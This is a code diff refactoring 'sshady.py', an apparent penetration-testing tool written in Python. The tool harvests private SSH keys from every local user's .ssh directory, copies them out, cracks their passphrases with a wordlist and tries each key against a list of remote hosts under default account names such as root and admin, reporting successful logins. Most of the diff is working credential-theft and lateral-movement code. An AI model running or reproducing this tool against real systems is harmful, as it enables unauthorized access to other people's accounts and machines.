@@ -22,6 +22,7 @@ TODO:
        - Create unique list based on pwent for use on current network
   - Input directory full of keys, or specify /home rather than searching pwents
   - General cleanup.. globals, super long main(), etc.
+  - SIGINT handler
 
 Requires:
   - paramiko
@@ -35,35 +36,186 @@ import paramiko
 
 
 # Globals/Settings
-#WORDLIST = "wordlist.txt"
-TERSE = False
-CRACK = True
-OUTDIR = None
-HOSTFILE = None
-USERFILE = None
+#HOSTFILE = None
 
-USERS = ["root", "nagios", "admin", "guest", "www", "www-data", "rsync"]
 VALID_KEYS = []
 
 
 class Settings(object):
-    WORDLIST = "wordlist.txt"
+    """ Settings Object -- Stores various application settings and functions
+                        -- to update, retrieve, and manipulate them.
+    """
+    __config = {
+        "wordlist" : "wordlist.txt",
+        "terse" : False,
+        "crack" : True,
+        "outdir" : None,
+        "hostfile" : None,
+        "userfile" : None,
+    }
+
+    __settings = [
+        "wordlist",
+        "terse",
+        "crack",
+        "outdir",
+        "hostfile",
+        "userfile"
+    ]
+
+    hosts = []
+    users = ["root", "nagios", "admin", "guest", "www", "www-data", "rsync"]
+
+    @staticmethod
+    def config(name):
+        """ Settings.config() -- Retrieve a configuration setting.
+
+        Args:
+            name (str) - Name of configuration setting to retrieve.
+
+        Returns:
+            Contents of configuration setting.
+        """
+        return Settings.__config[name]
+
+
+    @staticmethod
+    def set(name, value):
+        """ Settings.set() -- Set a configuration setting.
+
+        Args:
+            name (str) - Name of configuration setting to set.
+            value      - Value to place into setting.
+        Returns:
+            Nothing.
+
+        Raises a NameError exception if the supplied setting does not exist.
+        """
+        if name in Settings.__settings:
+            Settings.__config[name] = value
+        else:
+            raise NameError("Not a valid setting for set() method: %s" % name)
+
 
     @staticmethod
     def update_wordlist(wordlist):
-        WORDLIST = wordlist
+        """ Settings.update_wordlist() -- Updates wordlist settings.
+
+        Args:
+            wordlist (str) - Path to wordlist.
+
+        Returns:
+            True if the wordlist is accessible.
+            False if the wordlist is not accessible.
+        """
+        # TODO: handle empty files
+        Settings.set("wordlist", wordlist)
 
         # Make sure wordlist is readable.
-        if not os.access(WORDLIST, os.R_OK):
-            xprint("[-] Unable to open wordlist %s for reading" % WORDLIST)
+        if not os.access(wordlist, os.R_OK):
+            xprint("[-] Unable to open wordlist %s for reading" % wordlist)
             xprint("[-] Exiting.")
             terseprint("Unable to open wordlist %s for reading. Exiting." % \
-                       WORDLIST)
+                       wordlist)
             return False
         return True
 
+
+    @staticmethod
+    def update_output_directory(directory):
+        """ Settings.update_output_directory() -- Updates output dir setting
+
+        Args:
+            directory (str) - Dictory to place discovered SSH keys into.
+
+        Returns:
+            True if the directory setting is valid and writable.
+            False if the directory is not writable or invalid.
+        """
+        if not directory:
+            return True
+
+        Settings.set("outdir", directory)
+
+        # Make sure output directory is writable.
+        if directory and not os.path.isdir(directory):
+            xprint("[-] %s is not a directory." % directory)
+            xprint("[-] Exiting.")
+            terseprint("%s is not a directory. Exiting." % directory)
+            return False
+
+        if directory and not os.access(directory, os.W_OK):
+            xprint("[-] Unable to write to output directory %s" % directory)
+            xprint("[-] Exiting.")
+            terseprint("Unable to write to output directory %s. Exiting." % \
+                       directory)
+            return False
+
+        return True
+
+    @staticmethod
+    def update_user_file(userfile):
+        """ Settings.update_user_file() -- Updates userfile setting
+
+        Args:
+            userfile (str) - Path to file containing lists of usernames.
+
+        Returns:
+            True if the setting is valid and the input file is readable.
+            False if the user file cannot be read.
+        """
+        # TODO: handle empty files.
+        if not userfile:
+            return True
+
+        Settings.set("userfile", userfile)
+
+        try:
+            with open(userfile) as inputfile:
+                Settings.users = [line.rstrip(os.linesep) \
+                                  for line in inputfile \
+                                  if line.rstrip(os.linesep)]
+        except IOError, err:
+            xprint("  [-] Unable to open user list %s: %s" % (userfile, err))
+            xprint("  [-] Exiting.")
+            return False
+
+        return True
+
+
+    @staticmethod
+    def update_host_file(hostfile):
+        """ Settings.update_host_file() -- Updates hostfile setting
+
+        Args:
+            hostfile (str) - Path to file containing list of hosts to attempt
+                             key-based SSH logins in "HOST PORT" format.
+
+        Returns:
+            True if the setting is valid and the input file is readable.
+            False if the input file cannot be read.
+        """
+        # TODO: handle empty files.
+        if not hostfile:
+            return True
+
+        Settings.set("hostfile", hostfile)
+
+        try:
+            with open(hostfile) as inputfile:
+                Settings.hosts = [line.rstrip(os.linesep) \
+                                  for line in inputfile \
+                                  if line.rstrip(os.linesep)]
+        except IOError, err:
+            xprint("  [-] Unable to open host list %s: %s" % (hostfile, err))
+            xprint("  [-] Exiting.")
+            return False
+
+        return True
+
+
 class Color(object):
-    """ Color Object
+    """ Color Object -- Contains constants and methods regarding ANSI colors.
     """
     BOLD = "\033[1m"
     END = "\033[0m"
@@ -103,7 +255,7 @@ def xprint(message):
     Returns:
         Nothing
     """
-    if not TERSE:
+    if not Settings.config("terse"):
         print message
 
 
@@ -116,7 +268,7 @@ def terseprint(message):
     Returns:
         Nothing
     """
-    if TERSE:
+    if Settings.config("terse"):
         print message
 
 
@@ -234,15 +386,16 @@ def process_key(keyfile, username):
         xprint("  [+] %s appears to be a valid key" % keyfile)
 
         # Copy keys for the future, if asked to do so.
-        if OUTDIR:
-            outfile = os.path.join(OUTDIR, "%s-%s" % \
+        if Settings.config("outdir"):
+            outfile = os.path.join(Settings.config("outdir"), "%s-%s" % \
                                    (username, os.path.basename(keyfile)))
             shutil.copy2(keyfile, outfile)
 
         # Crack passwords, if asked.
-        if CRACK:
-            xprint("    [*] Attempting to crack..")
-            crack_key(keyfile, username, Settings.WORDLIST)
+        if Settings.config("crack"):
+            xprint("    [*] Attempting to crack using wordlist: %s" % \
+                   Settings.config("wordlist"))
+            crack_key(keyfile, username, Settings.config("wordlist"))
         else:
             terseprint(keyfile)
     elif result == False:
@@ -250,7 +403,8 @@ def process_key(keyfile, username):
         return False
     elif result == None:
         # No password
-        xprint("  [+] %s appears to be a valid, passwordless key" % keyfile)
+        xprint(Color.bold_string(
+            "  [+] %s appears to be a valid, passwordless key" % keyfile))
         terseprint("%s -- NO PASSWORD" % keyfile)
         VALID_KEYS.append((username, keyfile, result))
 
@@ -280,7 +434,8 @@ def try_ssh_key_login(username, keyfile, password, host, port=22):
 
     key = key_type(keyfile, password=password)
 
-    # Supress error messages. TODO: figure out if there's a better way.
+    # Supress error messages.
+    #TODO: figure out if there's a better way.
     paramiko.util.log_to_file("/dev/null")
 
     try:
@@ -315,6 +470,8 @@ def find_ssh_directories():
         True
     """
     # TODO: search /home for orphaned home directories that may contain keys
+    xprint("[+] Searching for SSH keys via valid pwents..")
+
     for pwent in pwd.getpwall():
         user = pwent[0]
         sshdir = os.path.join(os.path.expanduser("~%s" % user), ".ssh")
@@ -327,7 +484,44 @@ def find_ssh_directories():
                     process_key(checkfile, user)
 
     xprint("")
-    xprint("[+] %s keys discovered." % len(VALID_KEYS))
+    xprint("[+] %s usable keys discovered." % len(VALID_KEYS))
+
+    return True
+
+
+def attempt_ssh_logins():
+    """ attempt_ssh_logins() -- Attempt to login to specified hosts using the
+                             -- keys discovered by this program.
+
+    Args:
+        None
+
+    Returns:
+        True
+    """
+    xprint("")
+    xprint("[+] Attempting to login to hosts using discovered keys..")
+
+    for host in Settings.hosts:
+        port = 22
+        if " " in host:
+            port = int(host.split()[1])
+            host = host.split()[0]
+        xprint("  [*] Trying %s:%s" % (host, port))
+
+        for key in VALID_KEYS:
+            username, keyfile, password = key
+
+            # Try username first
+            if try_ssh_key_login(username, keyfile, password, host, port):
+                xprint("    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
+                       (username, host, keyfile, password))
+
+            # Try list of usernames now.
+            for user in Settings.users:
+                if try_ssh_key_login(user, keyfile, password, host, port):
+                    xprint("    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
+                           (user, host, keyfile, password))
 
     return True
 
@@ -352,23 +546,23 @@ def parse_cli():
     parser.add_argument("-w",
                         "--wordlist",
                         help="Specify wordlist to use. Default: %s" % \
-                        Settings.WORDLIST,
+                        Settings.config("wordlist"),
                         required=False,
-                        default=Settings.WORDLIST)
+                        default=Settings.config("wordlist"))
     parser.add_argument("-n",
                         "--nocrack",
                         help="Don't attempt to crack SSH keys.",
                         action="store_false",
                         required=False,
                         default=True)
-    parser.add_argument("-d",
-                        "--directory",
+    parser.add_argument("-o",
+                        "--outdir",
                         help="Optional directory to save keys to",
                         required=False,
                         default=None)
     parser.add_argument("-f",
                         "--hosts",
-                        help="File containing list of hosts to try discovered keys. Format: \"ip.address port\" (port optional)",
+                        help="File containing list of hosts. Format: \"ip.address port\" (port optional)",
                         required=False,
                         default=None)
     parser.add_argument("-u",
@@ -383,9 +577,6 @@ def parse_cli():
 
     args = parser.parse_args()
 
-    if args.nocolor:
-        Color.disable()
-
     return args
 
 
@@ -399,51 +590,26 @@ def main():
         os.EX_OK on successful run
         os_EX_USAGE on failed run
     """
-    #global WORDLIST
-    global TERSE
-    global CRACK
-    global OUTDIR
-    global USERS
-    global HOSTFILE
-    global USERFILE
+    args = parse_cli()
+
+    if args.nocolor:
+        Color.disable()
+
+    # Need to configure terse first for proper output
+    Settings.set("terse", args.terse)
 
     xprint("[+] sshady.py -- by Daniel Roberson @dmfroberson")
     xprint("")
 
-    args = parse_cli()
+    # Update setting for whether or not to attempt cracking of SSH keys
+    Settings.set("crack", args.nocrack)
 
-    if not Settings.update_wordlist(args.wordlist):
+    # Make sure settings are sane
+    if not Settings.update_wordlist(args.wordlist) or \
+       not Settings.update_output_directory(args.outdir) or \
+       not Settings.update_user_file(args.users) or \
+       not Settings.update_host_file(args.hosts):
         return os.EX_USAGE
-    
-    #WORDLIST = args.wordlist
-    TERSE = args.terse
-    CRACK = args.nocrack
-    OUTDIR = args.directory
-    HOSTFILE = args.hosts
-    USERFILE = args.users
-
-    # # Make sure wordlist is readable.
-    # if not os.access(WORDLIST, os.R_OK):
-    #     xprint("[-] Unable to open wordlist %s for reading" % WORDLIST)
-    #     xprint("[-] Exiting.")
-    #     terseprint("Unable to open wordlist %s for reading. Exiting." % \
-    #                WORDLIST)
-    #     return os.EX_USAGE
-
-    # Make sure output directory is writable.
-    if OUTDIR and not os.path.isdir(OUTDIR):
-        xprint("[-] %s is not a directory." % OUTDIR)
-        xprint("[-] Exiting.")
-        terseprint("%s is not a directory. Exiting." % OUTDIR)
-        return os.EX_USAGE
-
-    if OUTDIR and not os.access(OUTDIR, os.W_OK):
-        xprint("[-] Unable to write to output directory %s" % OUTDIR)
-        xprint("[-] Exiting.")
-        terseprint("Unable to write to output directory %s. Exiting." % OUTDIR)
-        return os.EX_USAGE
-
-    xprint("[+] Searching for SSH keys..")
 
     # Search for users passwords.
     # TODO don't do this if key directory is specified.
@@ -451,49 +617,8 @@ def main():
 
     # If a hostfile is specified, loop through hosts and try to login with
     # each of the harvested keys.
-    if HOSTFILE:
-        xprint("")
-        xprint("[+] Attempting to login to hosts using discovered keys..")
-
-        # Get list of hostnames from file, if specified
-        try:
-            hosts = [line.rstrip(os.linesep) for line in open(HOSTFILE)]
-        except IOError, err:
-            xprint("  [-] Unable to open host list %s: %s" % (HOSTFILE, err))
-            xprint("  [-] Exiting.")
-            return os.EX_USAGE
-
-        # Get list of usernames from file, if specified
-        # TODO: make sure usernames are valid.
-        if USERFILE:
-            try:
-                USERS = [line.rstrip(os.linesep) for line in open(USERFILE)]
-            except IOError, err:
-                xprint("  [-] Unable to open user list %s: %s" % \
-                       (USERFILE, err))
-                xprint("  [-] Exiting.")
-                return os.EX_USAGE
-
-        for host in hosts:
-            port = 22
-            if " " in host:
-                port = int(host.split()[1])
-                host = host.split()[0]
-            xprint("  [*] Trying %s:%s" % (host, port))
-
-            for key in VALID_KEYS:
-                username, keyfile, password = key
-
-                # Try username first
-                if try_ssh_key_login(username, keyfile, password, host, port):
-                    xprint("    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
-                           (username, host, keyfile, password))
-
-                # Try list of usernames now.
-                for user in USERS:
-                    if try_ssh_key_login(user, keyfile, password, host, port):
-                        xprint("    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
-                               (user, host, keyfile, password))
+    if Settings.config("hostfile"):
+        attempt_ssh_logins()
 
     xprint("")
     xprint("[+] You must defeat Sheng Long to stand a chance.")
